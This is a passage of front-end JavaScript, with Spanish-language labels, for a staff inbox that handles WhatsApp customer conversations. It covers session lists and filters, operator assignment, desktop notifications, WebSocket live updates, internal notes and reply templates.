            const body = (s.last_msg_preview || 'Nuevo mensaje').slice(0, 140);
            const n = new Notification(`Inbox · ${title}`, {
                body,
                tag: `inbox-${s.id}`,
                icon: '/assets/icon-192.png',
                silent: false,
            });
            n.onclick = () => {
                try { window.focus(); } catch (_) {}
                try { n.close(); } catch (_) {}
                if (typeof selectInboxSession === 'function') {
                    if (state.currentPage !== 'inbox' && typeof go === 'function') {
                        go('inbox');
                    }
                    selectInboxSession(s.id);
                }
            };
        } catch (_) {}
    });
}

const _INBOX_STATE_LABELS = {
    waiting_first_contact: 'Esperando 1er contacto',
    active: 'Activo',
    operator_engaged: 'Con operador',
    quote_sent: 'Cotizacion enviada',
    closed: 'Cerrado',
};
const _INBOX_STATE_COLORS = {
    waiting_first_contact: '#d97706',
    active: '#2563eb',
    operator_engaged: '#16a34a',
    quote_sent: '#059669',
    closed: '#6b7280',
};

function _inboxRelTime(iso) {
    if (!iso) return '-';
    const d = new Date(iso);
    const diff = (Date.now() - d.getTime()) / 1000;
    if (diff < 60) return 'ahora';
    if (diff < 3600) return `${Math.floor(diff / 60)}m`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h`;
    const days = Math.floor(diff / 86400);
    if (days < 7) return `${days}d`;
    return d.toLocaleDateString();
}

function _inboxOperatorBadge(s) {
    if (!s || !s.operator_id) {
        return `<span class="inbox-badge" style="background:#fef3c7;color:#92400e" title="Sin asignar">Sin asignar</span>`;
    }
    const me = state.user && state.user.id === s.operator_id;
    const label = s.operator_name || s.operator_email || `#${s.operator_id}`;
    const bg = me ? '#dbeafe' : '#e0e7ff';
    const fg = me ? '#1e40af' : '#3730a3';
    const prefix = me ? 'Tu' : esc(label);
    return `<span class="inbox-badge" style="background:${bg};color:${fg}" title="Asignado a ${esc(label)}">${prefix}</span>`;
}

function _inboxWindowBadge(w) {
    if (!w) return '';
    if (!w.open) {
        return `<span class="inbox-badge" style="background:#fee2e2;color:#991b1b">WA cerrada</span>`;
    }
    const h = Math.floor((w.seconds_left || 0) / 3600);
    const m = Math.floor(((w.seconds_left || 0) % 3600) / 60);
    const label = h > 0 ? `${h}h ${m}m` : `${m}m`;
    const color = h > 2 ? '#065f46' : '#92400e';
    const bg = h > 2 ? '#d1fae5' : '#fef3c7';
    return `<span class="inbox-badge" style="background:${bg};color:${color}">WA ${label}</span>`;
}

function _inboxStopPolling() {
    if (_inbox.pollTimer) { clearInterval(_inbox.pollTimer); _inbox.pollTimer = null; }
    _inboxWsDisconnect();
}

// ── 5.11 WebSocket live updates ──────────────────────────────
function _inboxWsUrl() {
    const proto = (location.protocol === 'https:') ? 'wss:' : 'ws:';
    const tok = encodeURIComponent(state.token || '');
    return `${proto}//${location.host}/api/v1/inbox/ws?token=${tok}`;
}

function _inboxStartPollingInterval() {
    if (_inbox.pollTimer) { clearInterval(_inbox.pollTimer); _inbox.pollTimer = null; }
    const interval = (_inbox.wsStatus === 'open') ? 60000 : 10000;
    _inbox.pollTimer = setInterval(() => {
        if (state.currentPage !== 'inbox') { _inboxStopPolling(); return; }
        loadInboxSessions({ silent: true });
        if (_inbox.selectedId) loadInboxSession(_inbox.selectedId, { silent: true });
    }, interval);
}

function _inboxWsConnect() {
    if (!state.token) return;
    if (_inbox.ws || _inbox.wsStatus === 'connecting') return;
    if (typeof WebSocket === 'undefined') return;
    try {
        _inbox.wsStatus = 'connecting';
        const sock = new WebSocket(_inboxWsUrl());
        _inbox.ws = sock;
        sock.addEventListener('open', () => {
            _inbox.wsStatus = 'open';
            _inbox.wsBackoffMs = 1000;
            _inboxStartPollingInterval();
        });
        sock.addEventListener('message', (ev) => {
            let payload;
            try { payload = JSON.parse(ev.data); } catch (_) { return; }
            if (!payload) return;
            if (payload.type === 'inbox_event') {
                _inboxHandleWsEvent(payload);
            }
            // Los 'hello'/'ping' se ignoran (el browser ya mantiene la conexion).
        });
        sock.addEventListener('close', () => {
            _inbox.ws = null;
            _inbox.wsStatus = 'off';
            _inboxStartPollingInterval();
            if (state.currentPage === 'inbox') _inboxWsScheduleReconnect();
        });
        sock.addEventListener('error', () => {
            try { sock.close(); } catch (_) {}
        });
    } catch (_) {
        _inbox.wsStatus = 'off';
        _inbox.ws = null;
        _inboxWsScheduleReconnect();
    }
}

function _inboxWsScheduleReconnect() {
    if (_inbox.wsReconnectTimer) return;
    const delay = Math.min(_inbox.wsBackoffMs || 1000, 30000);
    _inbox.wsReconnectTimer = setTimeout(() => {
        _inbox.wsReconnectTimer = null;
        _inbox.wsBackoffMs = Math.min((_inbox.wsBackoffMs || 1000) * 2, 30000);
        if (state.currentPage === 'inbox') _inboxWsConnect();
    }, delay);
}

function _inboxWsDisconnect() {
    if (_inbox.wsReconnectTimer) { clearTimeout(_inbox.wsReconnectTimer); _inbox.wsReconnectTimer = null; }
    if (_inbox.ws) { try { _inbox.ws.close(); } catch (_) {} _inbox.ws = null; }
    _inbox.wsStatus = 'off';
    _inbox.wsBackoffMs = 1000;
}

function _inboxHandleWsEvent(payload) {
    const ev = payload.event;
    const d = payload.data || {};
    const sid = d.session_id;
    // 5 familias consolidadas -> 1 handler uniforme.
    // Cualquier cambio dispara refresh de lista + detalle si es la activa.
    if (ev === 'message.created'
        || ev === 'session.operator_changed'
        || ev === 'session.state_changed'
        || ev === 'session.marked_read'
        || ev === 'session.tags_changed') {
        if (ev === 'session.tags_changed') {
            // Refrescar catalogo (usage_count puede haber cambiado)
            _inboxLoadTagCatalog({ force: true });
        }
        if (sid && _inbox.selectedId === sid) {
            loadInboxSession(sid, { silent: true });
        }
        loadInboxSessions({ silent: true });
    }
}

async function renderInbox() {
    if (!isStaff()) { showLoginModal(); navigate('home'); return; }
    _inboxStopPolling();

    const page = document.getElementById('page-content');
    page.innerHTML = `
        <style>
            .inbox-layout{display:grid;grid-template-columns:340px 1fr;gap:0;height:calc(100vh - 160px);min-height:480px;border:1px solid var(--gray-200);border-radius:10px;overflow:hidden;background:#fff}
            .inbox-list{border-right:1px solid var(--gray-200);display:flex;flex-direction:column;background:#fafafa;overflow:hidden}
            .inbox-list-header{padding:12px;border-bottom:1px solid var(--gray-200);background:#fff;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
            .inbox-items{overflow-y:auto;flex:1}
            .inbox-item{padding:12px;border-bottom:1px solid var(--gray-200);cursor:pointer;transition:background .15s}
            .inbox-item:hover{background:#f0f9ff}
            .inbox-item.active{background:#e0f2fe;border-left:3px solid #0284c7;padding-left:9px}
            .inbox-item-row1{display:flex;justify-content:space-between;align-items:center;margin-bottom:4px}
            .inbox-item-name{font-weight:600;font-size:14px;color:#111827;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:200px}
            .inbox-item-time{font-size:11px;color:#6b7280;white-space:nowrap}
            .inbox-item-preview{font-size:12.5px;color:#4b5563;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:4px}
            .inbox-item-meta{display:flex;gap:4px;flex-wrap:wrap;align-items:center}
            .inbox-badge{display:inline-block;padding:1px 7px;border-radius:8px;font-size:10.5px;font-weight:600;line-height:1.6}
            .inbox-pane{display:flex;flex-direction:column;overflow:hidden;background:#fff}
            .inbox-pane-header{padding:14px 18px;border-bottom:1px solid var(--gray-200);background:#fafafa}
            .inbox-timeline{flex:1;overflow-y:auto;padding:16px;background:#f3f4f6;display:flex;flex-direction:column;gap:10px}
            .inbox-msg{max-width:72%;padding:8px 12px;border-radius:10px;font-size:14px;line-height:1.45;white-space:pre-wrap;word-break:break-word}
            .inbox-msg-in{align-self:flex-start;background:#fff;border:1px solid var(--gray-200);border-radius:10px 10px 10px 2px}
            .inbox-msg-out{align-self:flex-end;background:#dcf8c6;border-radius:10px 10px 2px 10px}
            .inbox-msg-bot{align-self:flex-end;background:#e0e7ff;border-radius:10px 10px 2px 10px}
            .inbox-msg-meta{font-size:10.5px;color:#6b7280;margin-top:3px}
            .inbox-empty{padding:40px 20px;color:#6b7280;text-align:center}
            .inbox-composer{border-top:1px solid var(--gray-200);padding:10px;background:#fff;display:flex;gap:8px;align-items:flex-end}
            .inbox-composer textarea{flex:1;resize:none;min-height:44px;max-height:140px;padding:8px 10px;border:1px solid var(--gray-300);border-radius:8px;font-size:14px;font-family:inherit}
            .inbox-composer textarea:disabled{background:#f3f4f6;color:#9ca3af;cursor:not-allowed}
            .inbox-composer .hint{font-size:11px;color:#6b7280;padding:6px 12px;width:100%;text-align:center;background:#fef3c7;color:#92400e;border-top:1px solid var(--gray-200)}
            .inbox-item.unread{background:#fffbeb}
            .inbox-item.unread.active{background:#fef3c7}
            .inbox-item-name.unread{font-weight:700}
            .inbox-unread-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#f59e0b;margin-right:6px;vertical-align:middle}
            .inbox-unread-badge{display:inline-block;background:#dc2626;color:#fff;font-size:11px;font-weight:700;padding:1px 7px;border-radius:10px;margin-left:6px;vertical-align:middle}
            .inbox-toolbar-row{display:flex;gap:6px;align-items:center;width:100%}
            .inbox-toolbar-row2{display:flex;gap:6px;align-items:center;width:100%;margin-top:6px;font-size:12px;color:#6b7280}
            .inbox-toolbar-row2 label{display:flex;gap:4px;align-items:center;cursor:pointer}
            .inbox-toolbar-row2 .count{margin-left:auto}
            .inbox-tag{display:inline-flex;align-items:center;gap:4px;padding:1px 7px;border-radius:10px;font-size:10.5px;font-weight:600;line-height:1.6;text-transform:capitalize;white-space:nowrap}
            .inbox-tag-x{cursor:pointer;opacity:.7;font-weight:700;font-size:12px;line-height:1}
            .inbox-tag-x:hover{opacity:1}
            .inbox-tag-filter-bar{display:flex;gap:4px;flex-wrap:wrap;padding:6px 12px;border-bottom:1px solid var(--gray-200);background:#fff}
            .inbox-tag-filter-bar:empty{display:none}
            .inbox-tag-popover{position:absolute;background:#fff;border:1px solid var(--gray-300);border-radius:8px;box-shadow:0 6px 24px rgba(0,0,0,.12);padding:10px;z-index:1000;min-width:260px}
            .inbox-tag-popover-row{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:8px}
            .inbox-tag-color-swatch{width:22px;height:22px;border-radius:50%;cursor:pointer;border:2px solid transparent}
            .inbox-tag-color-swatch.selected{border-color:#111}
            .inbox-tag-suggestion{padding:4px 8px;cursor:pointer;border-radius:6px;font-size:13px}
            .inbox-tag-suggestion:hover{background:#f3f4f6}
            .inbox-tags-line{display:flex;gap:4px;flex-wrap:wrap;align-items:center;margin-top:6px}
            @media (max-width:720px){
                .inbox-layout{grid-template-columns:1fr;height:auto}
                .inbox-list{max-height:360px}
            }
        </style>
        <div class="page-header">
            <h1 class="page-title">Inbox — Conversaciones <span id="inbox-header-unread"></span></h1>
            <p class="page-subtitle">Vista unificada de clientes y operadores</p>
            <div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap">
                <button class="btn btn-secondary btn-sm" onclick="openInboxMetrics()">${icon('bar-chart',14)} Metricas / SLA</button>
                <button id="inbox-notif-btn" class="btn btn-secondary btn-sm" onclick="toggleInboxNotifications()" title="Notificaciones del escritorio cuando hay un nuevo mensaje">${icon('bell',14)} Notif: off</button>
                <button class="btn btn-secondary btn-sm" onclick="testInboxNotification()" title="Enviar push de prueba a los dispositivos suscritos">${icon('send',14)} Probar push</button>
                ${isManager() ? `<button class="btn btn-secondary btn-sm" onclick="openInboxAutoAssign()" title="Configurar auto-asignacion de operadores">${icon('users',14)} Auto-asignacion</button>` : ''}
            </div>
        </div>
        <div class="inbox-layout">
            <aside class="inbox-list">
                <div class="inbox-list-header">
                    <div class="inbox-toolbar-row">
                        <select id="inbox-filter" class="form-input" style="flex:1;max-width:200px">
                            <option value="open">Abiertas</option>
                            <option value="waiting_first_contact">Esperando 1er contacto</option>
                            <option value="active">Activas</option>
                            <option value="operator_engaged">Con operador</option>
                            <option value="quote_sent">Cotizacion enviada</option>
                            <option value="closed">Cerradas</option>
                            <option value="">Todas</option>
                        </select>
                        <button class="btn btn-secondary btn-sm" onclick="loadInboxSessions()" title="Refrescar">${icon('refresh',14)}</button>
                    </div>
                    <div class="inbox-toolbar-row">
                        <select id="inbox-assigned" class="form-input" style="flex:1">
                            <option value="">Cualquier asignacion</option>
                            <option value="mine">Mias</option>
                            <option value="unassigned">Sin asignar</option>
                        </select>
                        <input id="inbox-search" type="search" class="form-input" placeholder="Buscar..." style="flex:1">
                    </div>
                    <div class="inbox-toolbar-row2">
                        <label><input type="checkbox" id="inbox-unread-only"> Solo no leidas</label>
                        <span class="count" id="inbox-list-count"></span>
                    </div>
                </div>
                <div id="inbox-tag-filter-host"></div>
                <div class="inbox-items" id="inbox-items"><div class="inbox-empty">Cargando...</div></div>
            </aside>
            <main class="inbox-pane" id="inbox-pane">
                <div class="inbox-empty" style="margin:auto">Selecciona una conversacion para ver el detalle</div>
            </main>
        </div>
    `;

    document.getElementById('inbox-filter').value = _inbox.filter;
    document.getElementById('inbox-filter').addEventListener('change', (e) => {
        _inbox.filter = e.target.value;
        loadInboxSessions();
    });
    const searchInput = document.getElementById('inbox-search');
    searchInput.value = _inbox.search;
    searchInput.addEventListener('input', (e) => {
        if (_inbox.searchDebounce) clearTimeout(_inbox.searchDebounce);
        _inbox.searchDebounce = setTimeout(() => {
            _inbox.search = e.target.value.trim();
            loadInboxSessions();
        }, 300);
    });
    const unreadToggle = document.getElementById('inbox-unread-only');
    unreadToggle.checked = _inbox.unreadOnly;
    unreadToggle.addEventListener('change', (e) => {
        _inbox.unreadOnly = e.target.checked;
        loadInboxSessions();
    });
    const assignedSelect = document.getElementById('inbox-assigned');
    assignedSelect.value = _inbox.assignedFilter;
    assignedSelect.addEventListener('change', (e) => {
        _inbox.assignedFilter = e.target.value;
        loadInboxSessions();
    });

    // Reset baseline de notificaciones al entrar al inbox
    _inbox.notifInit = false;
    _inbox.notifLastSeenIds = null;
    _inboxUpdateNotifButton();
    // 5.12: cargar catalogo de tags en paralelo
    _inboxLoadTagCatalog({ force: true }).then(() => _inboxUpdateTagFilterBar());
    await loadInboxSessions();
    // 5.11: intentar WS; el polling se ajusta al estado (10s offline, 60s con WS).
    _inboxWsConnect();
    _inboxStartPollingInterval();
}

async function loadInboxSessions({ silent = false } = {}) {
    const container = document.getElementById('inbox-items');
    if (!container) return;
    if (!silent) container.innerHTML = '<div class="inbox-empty">Cargando...</div>';
    const params = new URLSearchParams();
    if (_inbox.filter) params.set('state', _inbox.filter);
    if (_inbox.search) params.set('search', _inbox.search);
    if (_inbox.unreadOnly) params.set('unread_only', 'true');
    if (_inbox.assignedFilter) params.set('assigned', _inbox.assignedFilter);
    if (_inbox.tagFilter.length) params.set('tags', _inbox.tagFilter.join(','));
    const qs = params.toString() ? `?${params.toString()}` : '';
    const resp = await API.inboxSessions(qs);
    if (!resp.ok) {
        container.innerHTML = '<div class="inbox-empty">Error cargando sesiones</div>';
        return;
    }
    _inbox.sessions = resp.data || [];
    _inbox.unreadCount = resp.unread_count || 0;
    _inboxUpdateUnreadBadges(resp.total || 0);
    _inboxMaybeNotify(_inbox.sessions);
    if (!_inbox.sessions.length) {
        const msg = _inbox.search ? 'Sin resultados para esa busqueda' : (_inbox.unreadOnly ? 'Sin conversaciones no leidas' : 'Sin conversaciones');
        container.innerHTML = `<div class="inbox-empty">${msg}</div>`;
        return;
    }
    container.innerHTML = _inbox.sessions.map(s => {
        const name = s.client_name || s.client_phone || `Pedido #${s.pedido_id}`;
        const stateColor = _INBOX_STATE_COLORS[s.state] || '#6b7280';
        const stateLabel = _INBOX_STATE_LABELS[s.state] || s.state;
        const preview = s.last_msg_preview || (s.state === 'waiting_first_contact' ? '<i>Esperando mensaje del cliente</i>' : '<i>Sin mensajes</i>');
        const dirPrefix = s.last_msg_direction === 'outbound' ? 'Tu: ' : '';
        const active = _inbox.selectedId === s.id ? ' active' : '';
        const unreadCls = s.unread ? ' unread' : '';
        const unreadDot = s.unread ? '<span class="inbox-unread-dot" title="Mensaje del cliente sin responder"></span>' : '';
        const nameCls = s.unread ? ' unread' : '';
        return `
            <div class="inbox-item${active}${unreadCls}" onclick="selectInboxSession(${s.id})">
                <div class="inbox-item-row1">
                    <span class="inbox-item-name${nameCls}">${unreadDot}${esc(name)}</span>
                    <span class="inbox-item-time">${_inboxRelTime(s.last_msg_at)}</span>
                </div>
                <div class="inbox-item-preview">${dirPrefix}${preview}</div>
                <div class="inbox-item-meta">
                    <span class="inbox-badge" style="background:${stateColor}20;color:${stateColor}">${esc(stateLabel)}</span>
                    ${s.pedido_ref ? `<span class="inbox-badge" style="background:#f3f4f6;color:#374151">${esc(s.pedido_ref)}</span>` : ''}
                    ${_inboxOperatorBadge(s)}
                    ${_inboxWindowBadge(s.wa_window)}
                    ${_inboxRenderItemTags(s.tags)}
                </div>
            </div>
        `;
    }).join('');
}

function _inboxUpdateUnreadBadges(total) {
    const headerEl = document.getElementById('inbox-header-unread');
    if (headerEl) {
        headerEl.innerHTML = _inbox.unreadCount > 0
            ? `<span class="inbox-unread-badge">${_inbox.unreadCount}</span>`
            : '';
    }
    const countEl = document.getElementById('inbox-list-count');
    if (countEl) {
        const parts = [];
        parts.push(`${total} sesion${total === 1 ? '' : 'es'}`);
        if (_inbox.unreadCount > 0 && !_inbox.unreadOnly) parts.push(`${_inbox.unreadCount} sin leer`);
        countEl.textContent = parts.join(' · ');
    }
    // mobile tab badge if present
    const navEl = document.querySelector('[data-nav-key="inbox"] .mobile-nav-badge');
    if (navEl) navEl.textContent = _inbox.unreadCount > 0 ? _inbox.unreadCount : '';
}

async function selectInboxSession(id) {
    _inbox.selectedId = id;
    document.querySelectorAll('.inbox-item').forEach(el => el.classList.remove('active'));
    const clicked = [...document.querySelectorAll('.inbox-item')].find(el => el.getAttribute('onclick') === `selectInboxSession(${id})`);
    if (clicked) clicked.classList.add('active');
    await loadInboxSession(id);
}

async function loadInboxSession(id, { silent = false } = {}) {
    const pane = document.getElementById('inbox-pane');
    if (!pane) return;
    if (!silent) pane.innerHTML = '<div class="inbox-empty" style="margin:auto">Cargando...</div>';
    const resp = await API.inboxSession(id);
    if (!resp.ok) {
        pane.innerHTML = '<div class="inbox-empty" style="margin:auto">Error cargando conversacion</div>';
        return;
    }
    const s = resp.data;
    const stateColor = _INBOX_STATE_COLORS[s.state] || '#6b7280';
    const stateLabel = _INBOX_STATE_LABELS[s.state] || s.state;
    const clientLine = [s.client_name, s.client_phone].filter(Boolean).join(' — ') || '(sin datos del cliente)';

    const msgsHtml = (s.messages || []).map(m => _renderInboxMessage(m)).join('');
    const canSend = s.state !== 'closed' && !!s.client_phone && !!(s.wa_window && s.wa_window.open);
    let composerReason = '';
    if (s.state === 'closed') composerReason = 'La sesion esta cerrada.';
    else if (!s.client_phone) composerReason = 'No hay telefono del cliente registrado.';
    else if (!(s.wa_window && s.wa_window.open)) composerReason = 'Ventana de 24h cerrada. Pedi al cliente que escriba para reabrirla, o contactalo por otro canal.';

    pane.innerHTML = `
        <div class="inbox-pane-header">
            <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:12px;flex-wrap:wrap">
                <div>
                    <h3 style="margin:0 0 4px;font-size:16px">${esc(clientLine)}</h3>
                    <div style="font-size:13px;color:#6b7280">
                        ${s.pedido_ref ? `<strong>${esc(s.pedido_ref)}</strong> — ${esc(s.pedido_title || '')}` : ''}
                    </div>
                </div>
                <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
                    <span class="inbox-badge" style="background:${stateColor}20;color:${stateColor}">${esc(stateLabel)}</span>
                    ${_inboxOperatorBadge(s)}
                    ${_inboxWindowBadge(s.wa_window)}
                    ${_inboxAssignButtons(s)}
                    ${s.pedido_id ? `<button class="btn btn-sm btn-secondary" onclick="openPedidoDetail(${s.pedido_id})">Abrir pedido</button>` : ''}
                </div>
            </div>
            ${_inboxRenderDetailTags(s)}
        </div>
        <div class="inbox-timeline" id="inbox-timeline">${msgsHtml || '<div class="inbox-empty" style="margin:auto">Sin mensajes todavia</div>'}</div>
        ${composerReason ? `<div class="hint">${esc(composerReason)}</div>` : ''}
        <div class="inbox-composer">
            <div style="display:flex;flex-direction:column;gap:4px;flex:1">
                <div style="display:flex;gap:4px;font-size:11px">
                    <button type="button" class="btn btn-secondary btn-sm" style="padding:2px 8px" onclick="openInboxTemplatesPicker(${s.id})" title="Plantillas">${icon('bookmark',12)} Plantillas</button>
                    <button type="button" class="btn btn-secondary btn-sm" style="padding:2px 8px" onclick="addInboxNote(${s.id})" title="Nota interna (solo web)">${icon('edit',12)} Nota</button>
                    <button type="button" class="btn btn-secondary btn-sm" style="padding:2px 8px" onclick="markInboxRead(${s.id})" title="Marcar como leido">${icon('check',12)} Leido</button>
                </div>
                <textarea id="inbox-input" placeholder="${canSend ? 'Escribe un mensaje… (Enter para enviar, Shift+Enter nueva linea)' : 'Envio deshabilitado'}" ${canSend ? '' : 'disabled'} onkeydown="_inboxComposerKey(event,${s.id})"></textarea>
            </div>
            <button class="btn btn-primary" ${canSend ? '' : 'disabled'} onclick="sendInboxMessage(${s.id})">${icon('send',16)} Enviar</button>
        </div>
    `;
    // 5.6: marcar leida automaticamente al abrir
    markInboxRead(s.id, { silent: true });
    const tl = document.getElementById('inbox-timeline');
    if (tl) tl.scrollTop = tl.scrollHeight;
    const input = document.getElementById('inbox-input');
    if (input && canSend && !silent) input.focus();
}

function _inboxComposerKey(e, id) {
    if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        sendInboxMessage(id);
    }
}

function _inboxAssignButtons(s) {
    const myId = state.user && state.user.id;
    const isManager = state.user && ['admin','superadmin','manager'].includes(state.user.role);
    if (s.state === 'closed') return '';
    const buttons = [];
    if (!s.operator_id) {
        buttons.push(`<button class="btn btn-sm btn-primary" onclick="claimInboxSession(${s.id})">Reclamar</button>`);
    } else if (s.operator_id === myId) {
        buttons.push(`<button class="btn btn-sm btn-secondary" onclick="releaseInboxSession(${s.id})">Liberar</button>`);
    } else if (isManager) {
        buttons.push(`<button class="btn btn-sm btn-secondary" onclick="claimInboxSession(${s.id})" title="Reasignar a ti">Tomar</button>`);
        buttons.push(`<button class="btn btn-sm btn-secondary" onclick="releaseInboxSession(${s.id})">Liberar</button>`);
    }
    if (isManager) {
        buttons.push(`<button class="btn btn-sm btn-secondary" onclick="openAssignInboxModal(${s.id})" title="Asignar a otro staff">Asignar...</button>`);
    }
    return buttons.join('');
}

async function claimInboxSession(id) {
    const resp = await API.inboxClaim(id);
    if (resp.ok) {
        toast('Sesion asignada', 'success');
        await loadInboxSession(id, { silent: true });
        loadInboxSessions({ silent: true });
    } else if (resp.conflict) {
        const who = resp.operator_name || resp.operator_email || `#${resp.operator_id}`;
        toast(`Ya asignada a ${who}. Pide a un manager que reasigne.`, 'error');
    } else {
        toast(resp.detail || 'Error al reclamar', 'error');
    }
}

async function releaseInboxSession(id) {
    if (!confirm('Liberar esta sesion?')) return;
    const resp = await API.inboxRelease(id);
    if (resp.ok) {
        toast('Sesion liberada', 'success');
        await loadInboxSession(id, { silent: true });
        loadInboxSessions({ silent: true });
    } else {
        toast(resp.detail || 'Error al liberar', 'error');
    }
}

async function openAssignInboxModal(id) {
    if (_inbox.operators === null) {
        const resp = await API.inboxOperators();
        _inbox.operators = resp.ok ? (resp.data || []) : [];
    }
    const options = _inbox.operators.map(u => (
        `<option value="${u.id}">${esc(u.name || u.email)} (${esc(u.role)})</option>`
    )).join('');
    openModal(`
        <h3 style="margin:0 0 12px">Asignar sesion</h3>
        <div class="form-group">
            <label class="form-label">Operador</label>
            <select id="assign-op-select" class="form-input">
                <option value="">— Sin asignar —</option>
                ${options}
            </select>
        </div>
        <div style="display:flex;gap:8px;justify-content:flex-end">
            <button class="btn btn-secondary" onclick="closeModal()">Cancelar</button>
            <button class="btn btn-primary" onclick="doAssignInbox(${id})">Asignar</button>
        </div>
    `);
}

async function doAssignInbox(id) {
    const sel = document.getElementById('assign-op-select');
    if (!sel) return;
    const val = sel.value ? parseInt(sel.value, 10) : null;
    const resp = await API.inboxAssign(id, val);
    if (resp.ok) {
        closeModal();
        toast('Asignacion actualizada', 'success');
        await loadInboxSession(id, { silent: true });
        loadInboxSessions({ silent: true });
    } else {
        toast(resp.detail || 'Error al asignar', 'error');
    }
}

// ── 5.3 Notas internas ─────────────────────────────────────────
async function addInboxNote(id) {
    const text = prompt('Nota interna (solo visible en el inbox web):');
    if (!text || !text.trim()) return;
    const resp = await API.inboxNote(id, text.trim());
    if (resp.ok) {
        toast('Nota agregada', 'success');
        await loadInboxSession(id, { silent: true });
    } else {
        toast(resp.detail || 'Error agregando nota', 'error');
    }
}

// ── 5.6 Marcado explicito de leido ─────────────────────────────
async function markInboxRead(id, { silent = false } = {}) {
    const resp = await API.inboxMarkRead(id);
    if (resp.ok) {
        if (!silent) toast('Marcada como leida', 'success');
        loadInboxSessions({ silent: true });
    } else if (!silent) {
        toast(resp.detail || 'Error marcando leida', 'error');
    }
}

// ── 5.4 Plantillas de respuesta rapida ─────────────────────────
async function openInboxTemplatesPicker(sessionId) {
    const resp = await API.inboxTemplates();
    const items = (resp && resp.ok) ? (resp.data || []) : [];
    const isManager = state.user && ['admin','superadmin','manager'].includes(state.user.role);

    const rows = items.length === 0
        ? `<div style="padding:16px;color:#6b7280;text-align:center">No hay plantillas. Crea la primera abajo.</div>`
        : items.map(t => `
            <div style="padding:8px;border:1px solid var(--gray-200);border-radius:6px;margin-bottom:6px">
                <div style="display:flex;justify-content:space-between;gap:8px;align-items:center">
                    <strong style="font-size:13px">${esc(t.title)}</strong>
                    <span style="font-size:10px;padding:1px 6px;border-radius:4px;background:${t.scope==='global'?'#e0e7ff;color:#4338ca':'#f3f4f6;color:#6b7280'}">${t.scope}</span>
                </div>
                <div style="font-size:12px;color:#4b5563;margin:4px 0;white-space:pre-wrap">${esc(t.body)}</div>
                <div style="display:flex;gap:4px">
                    <button class="btn btn-primary btn-sm" style="padding:2px 8px;font-size:11px" onclick="useInboxTemplate(${t.id}, ${sessionId})">Usar</button>
                    ${(t.scope==='personal' || isManager) ? `<button class="btn btn-secondary btn-sm" style="padding:2px 8px;font-size:11px" onclick="editInboxTemplate(${t.id}, ${sessionId})">Editar</button>` : ''}
                    ${(t.scope==='personal' || isManager) ? `<button class="btn btn-secondary btn-sm" style="padding:2px 8px;font-size:11px;color:#dc2626" onclick="deleteInboxTemplate(${t.id}, ${sessionId})">Eliminar</button>` : ''}
                </div>
            </div>
        `).join('');

    const html = `
        <div style="max-width:520px">
            <div style="max-height:40vh;overflow-y:auto;margin-bottom:12px">${rows}</div>
            <div style="border-top:1px solid var(--gray-200);padding-top:10px">
                <h4 style="margin:0 0 6px;font-size:13px">Nueva plantilla</h4>
                <input id="tpl-new-title" class="form-input" placeholder="Titulo" style="margin-bottom:6px">
                <textarea id="tpl-new-body" class="form-input" placeholder="Mensaje..." rows="3" style="margin-bottom:6px"></textarea>
                <div style="display:flex;gap:6px;align-items:center">
                    <select id="tpl-new-scope" class="form-input" style="flex:0 0 140px">
                        <option value="personal">Personal</option>
                        ${isManager ? '<option value="global">Global</option>' : ''}
                    </select>
                    <button class="btn btn-primary" onclick="createInboxTemplate(${sessionId})">Crear</button>
                </div>
            </div>
        </div>
    `;
    showModal('Plantillas', html);
}

async function createInboxTemplate(sessionId) {
    const title = (document.getElementById('tpl-new-title')?.value || '').trim();
    const body = (document.getElementById('tpl-new-body')?.value || '').trim();
    const scope = document.getElementById('tpl-new-scope')?.value || 'personal';
    if (!title || !body) {
        toast('Titulo y mensaje son requeridos', 'error');
        return;
    }
    const resp = await API.inboxTemplateCreate({ title, body, scope });
    if (resp.ok) {
        toast('Plantilla creada', 'success');
        openInboxTemplatesPicker(sessionId);
    } else {
        toast(resp.detail || 'Error creando plantilla', 'error');
    }
}

async function editInboxTemplate(id, sessionId) {
    const resp = await API.inboxTemplates();
    const t = (resp.data || []).find(x => x.id === id);
    if (!t) return;
    const title = prompt('Nuevo titulo:', t.title);
    if (title === null) return;
    const body = prompt('Nuevo mensaje:', t.body);
    if (body === null) return;
    const r = await API.inboxTemplateUpdate(id, {
        title: title.trim(), body: body.trim(), scope: t.scope,
    });
    if (r.ok) {
        toast('Plantilla actualizada', 'success');
        openInboxTemplatesPicker(sessionId);
    } else {
        toast(r.detail || 'Error', 'error');
    }
}

async function deleteInboxTemplate(id, sessionId) {
    if (!confirm('Eliminar esta plantilla?')) return;
    const r = await API.inboxTemplateDelete(id);
    if (r.ok) {
        toast('Plantilla eliminada', 'success');
        openInboxTemplatesPicker(sessionId);
    } else {
        toast(r.detail || 'Error eliminando', 'error');
    }
}

async function useInboxTemplate(tplId, sessionId) {
    const resp = await API.inboxTemplates();
    const t = (resp.data || []).find(x => x.id === tplId);
    if (!t) return;
    closeModal();
    const input = document.getElementById('inbox-input');
    if (input && !input.disabled) {
        input.value = input.value ? (input.value + '\n' + t.body) : t.body;
        input.focus();
    }
}

async function sendInboxMessage(id) {
    const input = document.getElementById('inbox-input');
    if (!input) return;
    const text = (input.value || '').trim();
    if (!text) return;
    input.disabled = true;
    const resp = await API.inboxSend(id, text);
    input.disabled = false;
    if (resp.ok) {
        input.value = '';
        await loadInboxSession(id, { silent: true });
        loadInboxSessions({ silent: true });
    } else {
        const modeMsg = {
            window_closed: 'Ventana de 24h cerrada',
            no_phone: 'Sin telefono del cliente',
            closed: 'Sesion cerrada',
        }[resp.mode] || resp.detail || 'No se pudo enviar';
        toast(modeMsg, 'error');
        input.focus();
    }
}

// ── Inbox metrics dashboard ────────────────────────────────────
function _fmtSec(s) {
    if (s === null || s === undefined) return '—';
    if (s < 60) return `${Math.round(s)}s`;
    if (s < 3600) return `${Math.round(s/60)}m`;
    return `${(s/3600).toFixed(1)}h`;
}
function _fmtHours(h) {
    if (h === null || h === undefined) return '—';
    if (h < 1) return `${Math.round(h*60)}m`;
